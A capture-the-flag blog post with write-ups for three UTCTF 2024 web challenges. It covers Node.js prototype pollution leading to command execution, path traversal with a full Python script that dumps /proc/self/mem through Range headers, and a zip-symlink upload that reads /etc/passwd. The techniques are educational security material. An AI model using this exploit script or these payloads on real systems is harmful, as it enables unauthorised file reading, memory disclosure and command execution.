---
layout: post
title: "UTCTF 2024 Writeups"
date: 2024-04-01T08:14:54+00:00
img_dir: "/assets/2024-04-01-utctf-writeup"
description: "Writeups of some challenges from UTCTF 2024"
tags:
- wordpress
- php
- exploit
---


# Easy Mergers v0.1

Challenge category : web\
Description :
```
Tired of getting your corporate mergers blocked by the FTC? Good news! Just give us your corporate information and let our unpaid interns do the work!

By Samintell (@samintell on discord)
```

The challenge is a simple webapp written in nodejs. [SOURCE](./src/) 
At first glance it is immediately clear (also from the title) that the app merges objects (called "companies"), analyzing the source we see that there are 2 endpoints:
```
/api/makeCompany
/api/absorbCompany/:cid
```
Let's try to understand how the app works : when we create a company (without the "absorb" flag) it creates an object with the values and attributes that we gave as input

![]({{ page.img_dir | relative_url }}/Easy_Mergers_v0.1/images/1.jpg)

![]({{ page.img_dir | relative_url }}/Easy_Mergers_v0.1/images/2.jpg)

The snippet of code that manages this endpoint is this:
```javascript
app.post('/api/makeCompany', function (req, res) {
  if (!req.session.init) {
    res.end("invalid session");
    return;
  }
  let data = req.body;
  if (data.attributes === undefined || data.values === undefined ||
    !Array.isArray(data.attributes) || !Array.isArray(data.values)) {
    res.end('attributes and values are incorrectly set');
    return;
  }
  
  let cNum = userCompanies[req.session.uid].length;
  let cObj = new Object();
  for (let j = 0; j < Math.min(data.attributes.length, data.values.length); j++) {
    if (data.attributes[j] != '' && data.attributes[j] != null) {
      cObj[data.attributes[j]] = data.values[j];
    }
    
  }
  cObj.cid = cNum;
  userCompanies[req.session.uid][cNum] = cObj;

  res.end(cNum + "");
})
```

instead when we create a company with the "absorb" flag by inserting the CID of another previously created company, it merges the two companies into a single object

![]({{ page.img_dir | relative_url }}/Easy_Mergers_v0.1/images/3.jpg)
![]({{ page.img_dir | relative_url }}/Easy_Mergers_v0.1/images/4.jpg)

As we notice from the response in Burp there are parameters `cmd` , `stdout`, `stderr` , so let's take a look at the source , in the route `app.post('/api/absorbCompany/:cid', function (req, res)` , we notice that a child process is started `merger.js` : 

```javascript
function isObject(obj) {
    return typeof obj === 'function' || typeof obj === 'object';
}

var secret = {}

const {exec} = require('child_process');

process.on('message', function (m) {
    let data = m.data;
    let orig = m.orig;
    for (let k = 0; k < Math.min(data.attributes.length, data.values.length); k++) {

        if (!(orig[data.attributes[k]] === undefined) && isObject(orig[data.attributes[k]]) && isObject(data.values[k])) {
            for (const key in data.values[k]) {
                orig[data.attributes[k]][key] = data.values[k][key];
            }
        } else if (!(orig[data.attributes[k]] === undefined) && Array.isArray(orig[data.attributes[k]]) && Array.isArray(data.values[k])) {
            orig[data.attributes[k]] = orig[data.attributes[k]].concat(data.values[k]);
        } else {
            orig[data.attributes[k]] = data.values[k];
        }
    }
    cmd = "./merger.sh";

    if (secret.cmd != null) {
        cmd = secret.cmd;
    }

    
    var test = exec(cmd, (err, stdout, stderr) => {
        retObj = {};
        retObj['merged'] = orig;
        retObj['err'] = err;
        retObj['stdout'] = stdout;
        retObj['stderr'] = stderr;
        process.send(retObj);
    });
    console.log(test);
});

```
In this case the goal of the challenge is "edit" (pollute) the `secret.cmd` with a os command like `cat ./flag.txt` , to do this we need to understand first how prototype pollution works ([PortSwigger Docs](https://portswigger.net/web-security/prototype-pollution/server-side) , [Hacktricks Docs](https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution))

We added some `console.log()` for debugging purpose , to understand how our input is processed during the execution :

```javascript
function isObject(obj) {
    return typeof obj === 'function' || typeof obj === 'object';
}

var secret = {}

const {exec} = require('child_process');

process.on('message', function (m) {
    console.log("\n\n =========NEW REQUEST MERGE============== \n\n")
    let data = m.data; // data: { attributes: [ '__proto__' ], values: [ [Object] ] }
    let orig = m.orig; // orig: { BBBB: 'BBBB', cid: 1 }
    console.log("\n Print data object: \n",data,"\nPrint orig object\n",orig)
    for (let k = 0; k < Math.min(data.attributes.length, data.values.length); k++) {
        
        if (!(orig[data.attributes[k]] === undefined) && isObject(orig[data.attributes[k]]) && isObject(data.values[k])) {
            console.log("Inside first IF : orig[data.attributes[k]] = ",orig[data.attributes[k]])
            
            for (const key in data.values[k]) {
            
                console.log(`\n Inside FOR :  \n\tkey = ${key} \n\t data.values[k] = ${data.values[k]} `)
            
                orig[data.attributes[k]][key] = data.values[k][key];
                console.log(`\norig[${data.attributes[k]}][${key}] = data.values[${k}][${key}]\n`)
            }
        } else if (!(orig[data.attributes[k]] === undefined) && Array.isArray(orig[data.attributes[k]]) && Array.isArray(data.values[k])) {
            
            orig[data.attributes[k]] = orig[data.attributes[k]].concat(data.values[k]);
        } else {
            
            orig[data.attributes[k]] = data.values[k];
        }
    }
    cmd = "./merger.sh";

    if (secret.cmd != null) {
        cmd = secret.cmd;
    }

    
    var test = exec(cmd, (err, stdout, stderr) => {
        retObj = {};
        retObj['merged'] = orig;
        retObj['err'] = err;
        retObj['stdout'] = stdout;
        retObj['stderr'] = stderr;
        process.send(retObj);
    });
    //console.log(test);
});

```

![]({{ page.img_dir | relative_url }}/Easy_Mergers_v0.1/images/5.jpg)

So if we send a legit HTTP request , we can see some debugging log but the first IF statement is not satisfied because the `isObject()` is false , so we can try to pollute `cmd` property :

![]({{ page.img_dir | relative_url }}/Easy_Mergers_v0.1/images/6.jpg)

![]({{ page.img_dir | relative_url }}/Easy_Mergers_v0.1/images/7.jpg)


You can try in your local machine , just download the [src]({{ page.img_dir | relative_url }}/Easy_Mergers_v0.1/src/) and build with docker-compose 


---

# Home on the Range

Challenge category : web\
Description :
```
I wrote a custom HTTP server to play with obscure HTTP headers.

By Jonathan (@JBYoshi on discord)


Unlock Hint for 0 points
If it seems like something's missing, that's completely intentional; you should be able to figure out why it's missing and where it currently is. You don't need to do any brute force guessing to figure out what that missing thing is.
```

The challenge is a simple webserver that responds only to get requests, after some initial testing and taking a look at the [SOURCE]({{ page.img_dir | relative_url }}/Home_on_the_Range/src/server.py) , I noticed that it is vulnerable to path traversal
![]({{ page.img_dir | relative_url }}/Home_on_the_Range/images/1.jpg)

In the source we see the path of the flag.txt hardcoded but if we try to send an http request it will give us 404 status code, because the file does not exist it is removed by the instruction : `os.remove(FLAG_PATH)` , so the flag is stored in a variable `the_flag`

![]({{ page.img_dir | relative_url }}/Home_on_the_Range/images/2.jpg)

 therefore the only way to read it is to analyze the process memory and to do this we use path traversal to navigate to /proc/self/...

First we take a look at /proc/self/maps ([docs](https://www.baeldung.com/linux/proc-id-maps)) that is a "symlink" to the /proc/$PID/maps .
Each row in /proc/$PID/maps describes a region of contiguous virtual memory in a process or thread. Each row has the following fields:

![]({{ page.img_dir | relative_url }}/Home_on_the_Range/images/5.jpg)

then we can use the obtained memory address ranges to read memory regions, sending an http request to /proc/self/mem ([docs](https://unix.stackexchange.com/a/6302)) with RANGE header

looking at the [SOURCE](./src/server.py) we notice that the server accepts the RANGE header ([Range header docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Range))
```
The Range HTTP request header indicates the parts of a resource that the server should return. Several parts can be requested at the same time in one Range header, and the server may send back these ranges in a multipart document. If the server sends back ranges, it uses the 206 Partial Content status code for the response. If the ranges are invalid, the server returns the 416 Range Not Satisfiable error.
```
![]({{ page.img_dir | relative_url }}/Home_on_the_Range/images/3.jpg)

![]({{ page.img_dir | relative_url }}/Home_on_the_Range/images/4.jpg)

So to "dump" the entire process memory I used this python [script]({{ page.img_dir | relative_url }}/Home_on_the_Range/src/exploit.py) : 

```python

import requests
import socket

def send_http_request(host, port, request): # we use Socket module instead of Request module because the HTTP response has a Content-Length: 0 so Request ignores the content of the response
    
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        client_socket.connect((host, port))

        client_socket.sendall(request.encode())
        response = b''
        while True:
            part = client_socket.recv(4096)
            if not part:
                break
            response += part
        
        return response.decode()
    
    finally:
        client_socket.close()


def read_mem_range(start, end):
    url = "http://localhost:3000/../../../../../../../../../../../../../proc/self/mem"
    headers = {
        "Host": "localhost:3000",
        "Range": f"bytes={start}-{end}",
        "Connection": "close"
    }
    s = requests.Session()
    r = requests.Request(method='GET',url=url, headers=headers)
    prep = r.prepare()
    prep.url = url 
   
    response=s.send(prep)
    return response.content

def main():
    host = "localhost"
    port = 3000
    http_request = "GET /../../../../../../../../../../../../../proc/self/maps HTTP/1.1\r\nHost: localhost:3000\r\nConnection: close\r\n\r\n"
    response = send_http_request(host, port, http_request)
    content=response.split("\r\n\r\n")[1] # Skip HTTP headers
    if content:
        lines = content.split('\n')  
        ranges = [line.split()[0] for line in lines if line.strip()]  # Extract memory ranges
        dec_ranges = [f"{int(start, 16)}-{int(end, 16)}" for start, end in (range_.split('-') for range_ in ranges)]

        # Read memory for each range
        for range_ in dec_ranges:
            start, end = range_.split('-')
            mem_content = read_mem_range(start, end)
            if mem_content:
                print(mem_content.decode(errors='ignore'))  # Decode memory content to string
            else:
                #print(f"Failed to read memory range: {range_}")
                print("\n")
    else:
        print(f"Failed to retrieve /proc/self/maps: {response.status_code}")

if __name__ == "__main__":
    main()


```

Let's start the script and redirect the output to a file `python exploit.py > output.txt`
now in the `output.txt` file we have the dumped contents of the memory in raw bytes, we can pipe it with `strings` and `grep` to extract the flag which we know has the format `flag{...}`  (in my case because I started the server locally)
![]({{ page.img_dir | relative_url }}/Home_on_the_Range/images/6.jpg)


---

# Schrödinger
Challenge category: Web</br>
Description </br>
```
Hey, my digital cat managed to get into my server and I can't get him out.

The only thing running on the server is a website a colleague of mine made.

Can you find a way to use the website to check if my cat's okay? He'll likely be in the user's home directory.

You'll know he's fine if you find a "flag.txt" file.
```
## Overview
Basically we are prompted in front of a simple web page that asks you to upload a *ZIP* file then it will display its content

![webpage]({{ page.img_dir | relative_url }}/Schrödinger/images/webpage.png)

We can already guess what's the vulnerability here, and more specifically the scenario is about [Zip File Automatically decompressed Upload](https://book.hacktricks.xyz/pentesting-web/file-upload#zip-tar-file-automatically-decompressed-upload)

To briefly describe the steps
1. Create a symbolic link to the target file (i.e /etc/passwd)
2. Create a Zip Archive that contains that symlink
3. Upload and read the content of the dereferenced symlink

The only thing here is to figure out where the flag is located, we can read */etc/passwd* in order to get the user running on the machine and then guess the flag location as /home/[user]/flag.txt

## Solution
Create a zip to read /etc/passwd as explained before
```
ln -s /etc/passwd test
zip --symlinks test.zip test
```
![etcpasswd]({{ page.img_dir | relative_url }}/Schrödinger/images/passwd.png)

The user is *copenhagen* (the only one with /bin/sh) and now we can proceed to read /home/copenhagen/flag.txt 
```
mkdir /home/copenhagen
touch /home/copenhagen/flag.txt
ln -s /home/copenhagen/flag.txt flag
zip --symlinks test.zip flag
```
and here's the flag

![flag]({{ page.img_dir | relative_url }}/Schrödinger/images/flag.png)

I've also included the python [source]({{ page.img_dir | relative_url }}/Schrödinger/src/server.py) for the application, still dumped with the symlink vulnerability, but index.html and file_upload.html are not included 


